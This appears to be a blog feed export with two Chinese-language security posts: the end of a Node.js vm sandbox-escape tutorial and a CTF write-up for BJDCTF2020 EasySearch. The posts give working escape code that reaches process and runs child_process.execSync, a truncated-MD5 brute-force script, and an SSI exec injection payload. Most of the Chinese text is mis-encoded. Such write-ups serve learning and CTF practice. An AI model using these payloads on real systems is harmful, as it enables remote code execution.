2;&#x27;</span>, sandbox)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(globalVar))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; globalVar: 2 &#125;</span><br><span class="line">3</span><br></pre></td></tr></table></figure><blockquote><p>util.inspect(object,[showHidden],[depth],[colors]) æ˜¯<strong>ä¸€ä¸ªå°†ä»»æ„å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„æ–¹æ³•ï¼Œé€šå¸¸ç”¨äºè°ƒè¯•å’Œé”™è¯¯è¾“å‡º</strong>ã€‚ å®ƒè‡³å°‘æ¥å—ä¸€ä¸ªå‚æ•°objectï¼Œå³è¦è½¬æ¢çš„å¯¹è±¡ã€‚</p></blockquote><h4 id="vm-runInNewContext-code-sandbox-options"><a href="#vm-runInNewContext-code-sandbox-options" class="headerlink" title="vm.runInNewContext(code[, sandbox][, options])"></a>vm.runInNewContext(code[, sandbox][, options])</h4><blockquote><p>creatContextå’ŒrunInContextçš„ç»“åˆç‰ˆï¼Œä¼ å…¥è¦æ‰§è¡Œçš„ä»£ç å’Œæ²™ç®±å¯¹è±¡ã€‚</p></blockquote><h4 id="vm-Scriptç±»"><a href="#vm-Scriptç±»" class="headerlink" title="vm.Scriptç±»"></a>vm.Scriptç±»</h4><blockquote><p> vm.Scriptç±»å‹çš„å®ä¾‹åŒ…å«è‹¥å¹²é¢„ç¼–è¯‘çš„è„šæœ¬ï¼Œè¿™äº›è„šæœ¬èƒ½å¤Ÿåœ¨ç‰¹å®šçš„æ²™ç®±ï¼ˆæˆ–è€…ä¸Šä¸‹æ–‡ï¼‰ä¸­è¢«è¿è¡Œã€‚</p></blockquote><h4 id="new-vm-Script-code-options"><a href="#new-vm-Script-code-options" class="headerlink" title="new vm.Script(code, options)"></a>new vm.Script(code, options)</h4><blockquote><p>åˆ›å»ºä¸€ä¸ªæ–°çš„vm.Scriptå¯¹è±¡åªç¼–è¯‘ä»£ç ä½†ä¸ä¼šæ‰§è¡Œå®ƒã€‚ç¼–è¯‘è¿‡çš„vm.Scriptæ­¤åå¯ä»¥è¢«å¤šæ¬¡æ‰§è¡Œã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œcodeæ˜¯ä¸ç»‘å®šäºä»»ä½•å…¨å±€å¯¹è±¡çš„ï¼Œç›¸åï¼Œå®ƒä»…ä»…ç»‘å®šäºæ¯æ¬¡æ‰§è¡Œå®ƒçš„å¯¹è±¡ã€‚</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;</span><br><span class="line">    <span class="attr">animal</span>: <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line">    <span class="attr">count</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">&#x27;count += 1; name = &quot;kitty&quot;;&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox)</span><br><span class="line">script.<span class="title function_">runInContext</span>(context)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; animal: &#x27;cat&#x27;, count: 3, name: &#x27;kitty&#x27; &#125;</span><br></pre></td></tr></table></figure><h2 id="vmæ²™ç®±é€ƒé€¸çš„ä¸€äº›æƒ…å†µ"><a href="#vmæ²™ç®±é€ƒé€¸çš„ä¸€äº›æƒ…å†µ" class="headerlink" title="vmæ²™ç®±é€ƒé€¸çš„ä¸€äº›æƒ…å†µ"></a>vmæ²™ç®±é€ƒé€¸çš„ä¸€äº›æƒ…å†µ</h2><blockquote><p>æˆ‘ä»¬ä¸€èˆ¬è¿›è¡Œæ²™ç®±é€ƒé€¸æœ€åéƒ½æ˜¯è¿›è¡Œrceï¼Œé‚£ä¹ˆåœ¨Nodeé‡Œè¦è¿›è¡Œrceå°±éœ€è¦proccesäº†ï¼Œåœ¨è·å–åˆ°processå¯¹è±¡åæˆ‘ä»¬å°±å¯ä»¥ç”¨requireæ¥å¯¼å…¥child_processï¼Œå†åˆ©ç”¨child_processæ‰§è¡Œå‘½ä»¤ã€‚ä½†processæŒ‚è½½åœ¨globalä¸Šï¼Œä½†æ˜¯æˆ‘ä»¬ä¸Šé¢è¯´äº†åœ¨<code>creatContext</code>åæ˜¯ä¸èƒ½è®¿é—®åˆ°globalçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆçš„ç›®æ ‡æ˜¯é€šè¿‡å„ç§åŠæ³•å°†globalä¸Šçš„processå¼•å…¥åˆ°æ²™ç®±ä¸­ã€‚</p></blockquote><h4 id="this"><a href="#this" class="headerlink" title="this"></a>this</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return process.env&#x27;)()`</span>);</span><br><span class="line"><span class="comment">//const y1 = vm.runInNewContext(`this.toString.constructor(&#x27;return process&#x27;)()`);</span></span><br><span class="line">y1.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„thisæŒ‡å‘çš„æ˜¯å½“å‰ä¼ é€’ç»™<code>runInNewContext</code>çš„å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯ä¸å±äºæ²™ç®±ç¯å¢ƒçš„ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªå¯¹è±¡è·å–åˆ°å®ƒçš„æ„é€ å™¨ï¼Œå†è·å¾—ä¸€ä¸ªæ„é€ å™¨å¯¹è±¡çš„æ„é€ å™¨ï¼ˆæ­¤æ—¶ä¸ºFunctionçš„constructorï¼‰ï¼Œæœ€åçš„<code>()</code>æ˜¯è°ƒç”¨è¿™ä¸ªç”¨Functionçš„constructorç”Ÿæˆçš„å‡½æ•°ï¼Œæœ€ç»ˆè¿”å›äº†ä¸€ä¸ªprocesså¯¹è±¡ã€‚</p><h4 id="é‡å†™toStringå‡½æ•°-arguments-callee-caller"><a href="#é‡å†™toStringå‡½æ•°-arguments-callee-caller" class="headerlink" title="é‡å†™toStringå‡½æ•°+arguments.callee.caller"></a>é‡å†™toStringå‡½æ•°+arguments.callee.caller</h4><blockquote><p>å‡½æ•°ä¸­çš„å†…ç½®å¯¹è±¡çš„å±æ€§<code>arguments.callee.caller</code>ï¼Œå®ƒå¯ä»¥è¿”å›å‡½æ•°çš„è°ƒç”¨è€…ã€‚</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`(() =&gt; &#123;</span></span><br><span class="line"><span class="string">    const a = &#123;&#125;</span></span><br><span class="line"><span class="string">    a.toString = function () &#123;</span></span><br><span class="line"><span class="string">      const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">      const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">      return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">  &#125;)()`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Hello &#x27;</span> + res)</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒtoStringè¢«é‡å†™,è€Œconsole.logæ—¶çš„å­—ç¬¦ä¸²æ‹¼æ¥è§¦å‘äº†toString,æ­¤æ—¶çš„è°ƒç”¨è€…ä¸ºglobalä¸‹çš„console.log,è‡ªç„¶å°±è¿”å›äº†ä¸€ä¸ªå¤–éƒ¨å¯¹è±¡,ç”±æ­¤è¿›è¡Œrce</p><h4 id="Proxy-get-é’©å­-arguments-callee-caller"><a href="#Proxy-get-é’©å­-arguments-callee-caller" class="headerlink" title="Proxy get:é’©å­ + arguments.callee.caller"></a>Proxy get:é’©å­ + arguments.callee.caller</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">(() =&gt;&#123;</span></span><br><span class="line"><span class="string">    const a = new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">    return a</span></span><br><span class="line"><span class="string">&#125;)()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> context = <span class="keyword">new</span> vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">const</span> res = vm.<span class="title function_">runInContext</span>(script, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">abc</span>)</span><br></pre></td></tr></table></figure><p>è§¦å‘åˆ©ç”¨é“¾çš„é€»è¾‘å°±æ˜¯æˆ‘ä»¬åœ¨<code>get:</code>è¿™ä¸ªé’©å­é‡Œå†™äº†ä¸€ä¸ªæ¶æ„å‡½æ•°ï¼Œå½“æˆ‘ä»¬åœ¨æ²™ç®±å¤–è®¿é—®proxyå¯¹è±¡çš„ä»»æ„å±æ€§ï¼ˆä¸è®ºæ˜¯å¦å­˜åœ¨ï¼‰è¿™ä¸ªé’©å­å°±ä¼šè‡ªåŠ¨è¿è¡Œï¼Œå®ç°äº†rceã€‚</p><p>æ­¤æ—¶çš„è°ƒç”¨è€…ä¾ç„¶åœ¨æ²™ç®±å¤–,å³arguments.callee.callerè¿”å›çš„å¯¹è±¡æ˜¯æ²™ç®±å¤–çš„å¯¹è±¡</p><p><strong>å½“æ²™ç®±çš„è¿”å›å€¼è¿”å›çš„æ˜¯æˆ‘ä»¬æ— æ³•åˆ©ç”¨çš„å¯¹è±¡æˆ–è€…æ²¡æœ‰è¿”å›å€¼æ—¶</strong>,è¿˜å¯ä»¥å€ŸåŠ©å¼‚å¸¸,å°†æ²™ç®±å†…çš„å¯¹è±¡æŠ›å‡ºå»,ç„¶ååœ¨å¤–éƒ¨æŠ›å‡º</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> script = </span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">    throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">        get: function()&#123;</span></span><br><span class="line"><span class="string">            const cc = arguments.callee.caller;</span></span><br><span class="line"><span class="string">            const p = (cc.constructor.constructor(&#x27;return process&#x27;))();</span></span><br><span class="line"><span class="string">            return p.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString();</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;)</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    vm.<span class="title function_">runInContext</span>(script, vm.<span class="title function_">createContext</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)));</span><br><span class="line">&#125;<span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error:&quot;</span> + e) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ç”¨catchæ•è·åˆ°äº†throwå‡ºçš„proxyå¯¹è±¡ï¼Œåœ¨console.logæ—¶ç”±äºå°†å­—ç¬¦ä¸²ä¸å¯¹è±¡æ‹¼æ¥ï¼Œå°†æŠ¥é”™ä¿¡æ¯å’Œrceçš„å›æ˜¾ä¸€èµ·å¸¦äº†å‡ºæ¥ã€‚</p><h1 id="vm2"><a href="#vm2" class="headerlink" title="vm2"></a>vm2</h1><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;vm&quot;&gt;&lt;a href=&quot;#vm&quot; class=&quot;headerlink&quot; title=&quot;vm&quot;&gt;&lt;/a&gt;vm&lt;/h1&gt;&lt;h2 id=&quot;å¸¸ç”¨çš„vmæ¨¡å—çš„API&quot;&gt;&lt;a href=&quot;#å¸¸ç”¨çš„vmæ¨¡å—çš„API&quot; class=&quot;headerlink&quot; title=&quot;å¸¸ç”¨çš„</summary>
      
    
    
    
    
    <category term="æ²™ç®±é€ƒé€¸" scheme="http://example.com/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTF2020 EasySearch</title>
    <link href="http://example.com/2024/01/24/BJDCTF2020-EasySearch/"/>
    <id>http://example.com/2024/01/24/BJDCTF2020-EasySearch/</id>
    <published>2024-01-24T08:17:42.000Z</published>
    <updated>2024-01-24T08:44:18.431Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h1><p>é€šè¿‡æ‰«æå‘ç°æºç æ³„éœ²</p><p>index.php.swp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">uniqid</span>().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.<span class="title function_ invoke__">get_hash</span>().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯ä¸€ä¸ªmd5æˆªæ–­</p><p>ä¹‹å‰çš„è„šæœ¬ç¨å¾®ä¿®æ”¹ä¸€ä¸‹å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> tp</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">knownMd5 = <span class="string">&#x27;6d0bc1&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(<span class="built_in">str</span>(text).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findCode</span>(<span class="params">code</span>):   </span><br><span class="line">    key = code.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])  </span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>]) </span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="keyword">if</span> md5(code)[<span class="number">0</span>:<span class="number">6</span>] == knownMd5:            </span><br><span class="line">            <span class="built_in">print</span> (code)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">list</span>=[] </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):    <span class="comment">#è¿™é‡Œçš„range(number)æŒ‡çˆ†ç ´å‡ºå¤šå°‘ç»“æœåœæ­¢</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = tp()    <span class="comment">#ä½¿ç”¨å¤šçº¿ç¨‹åŠ å¿«çˆ†ç ´é€Ÿåº¦</span></span><br><span class="line">pool.<span class="built_in">map</span>(findCode, <span class="built_in">list</span>) </span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·‘å‡ºæ¥æ˜¯<code>2020666</code></p><p>ä¼ å…¥ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240124162515513.png" alt="image-20240124162515513"></p><p>å“åº”å¤´ä¸­ä¼šè¿”å›å†™å…¥çš„shtmlçš„åœ°å€</p><p>è®¿é—®ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240124162701416.png" alt="image-20240124162701416"></p><p>è¿™æ ·çš„hello xxxæœ€å…ˆæƒ³åˆ°çš„å°±æ˜¯ssti,ä¸è¿‡è¿™é‡Œä¼¼ä¹ä¸å¤ªä¸€æ ·</p><p>å…ˆçœ‹çœ‹ä»€ä¹ˆæ˜¯shtml</p><h2 id="ä½•ä¸ºshtmlï¼Ÿ"><a href="#ä½•ä¸ºshtmlï¼Ÿ" class="headerlink" title="ä½•ä¸ºshtmlï¼Ÿ"></a>ä½•ä¸ºshtmlï¼Ÿ</h2><blockquote><p>SHTMLå³Server-Parsed HTMLã€‚</p><p>shtmlæ–‡ä»¶ï¼ˆè¿˜æœ‰stmã€shtmæ–‡ä»¶ï¼‰å°±æ˜¯åº”ç”¨äº†SSIæŠ€æœ¯çš„htmlæ–‡ä»¶ï¼Œæ‰€ä»¥åœ¨.shtmlé¡µé¢è¿”å›åˆ°å®¢æˆ·ç«¯å‰ï¼Œé¡µé¢ä¸­çš„SSIæŒ‡ä»¤å°†è¢«æœåŠ¡å™¨è§£æã€‚å¯ä»¥ä½¿ç”¨SSIæŒ‡ä»¤å°†å…¶å®ƒæ–‡ä»¶ã€å›¾ç‰‡åŒ…å«åœ¨é¡µé¢ä¸­ï¼Œä¹Ÿå¯ä»¥å°†å…¶å®ƒçš„CGIç¨‹åºåŒ…å«åœ¨é¡µé¢ä¸­ï¼Œå¦‚.aspxæ–‡ä»¶ã€‚åœ¨ç»™å®¢æˆ·ç«¯è¿”å›çš„é¡µé¢ä¸­ä¸ä¼šåŒ…å«SSIæŒ‡ä»¤ã€‚å¦‚æœSSIæŒ‡ä»¤ä¸èƒ½è¢«è§£æï¼Œåˆ™æµè§ˆå™¨ä¼šå°†å…¶åšä¸ºæ™®é€šçš„HTMLæ³¨é‡Šå¤„ç†</p></blockquote><p>å¯ä»¥çœ‹è§è¿™ä¸ªshtmlæ˜¯å¯ä»¥åŒ…å«SSIå‘½ä»¤çš„,é‚£ä»€ä¹ˆæ˜¯SSIå‘¢?</p><h2 id="ä½•ä¸ºSSI"><a href="#ä½•ä¸ºSSI" class="headerlink" title="ä½•ä¸ºSSI"></a>ä½•ä¸ºSSI</h2><blockquote><p>SSIå…¨ç§°æ˜¯Server Side Includesï¼Œå³æœåŠ¡å™¨ç«¯åŒ…å«ï¼Œæ˜¯ä¸€ç§åŸºäºæœåŠ¡å™¨ç«¯çš„ç½‘é¡µåˆ¶ä½œæŠ€æœ¯ã€‚</p><p>SSIæ˜¯åµŒå…¥HTMLé¡µé¢ä¸­çš„æŒ‡ä»¤ï¼Œåœ¨é¡µé¢è¢«æä¾›æ—¶ç”±æœåŠ¡å™¨è¿›è¡Œè¿ç®—ï¼Œä»¥å¯¹ç°æœ‰HTMLé¡µé¢å¢åŠ åŠ¨æ€ç”Ÿæˆçš„å†…å®¹ï¼Œè€Œæ— é¡»é€šè¿‡CGIç¨‹åºæä¾›å…¶æ•´ä¸ªé¡µé¢ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–åŠ¨æ€æŠ€æœ¯ã€‚</p></blockquote><p>SSIå¯ä»¥ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><p>ç¤ºä¾‹:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†usernameæ”¹æˆä¸Šé¢è¿™ç§ssiå‘½ä»¤ä»¥è¾¾åˆ°rce</p><p>æœ€ç»ˆpayload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password=2020666</span><br></pre></td></tr></table></figure><p>flagå°±åœ¨å½“å‰ç›®å½•çš„ä¸Šä¸€çº§ç›®å½•ä¸­</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" 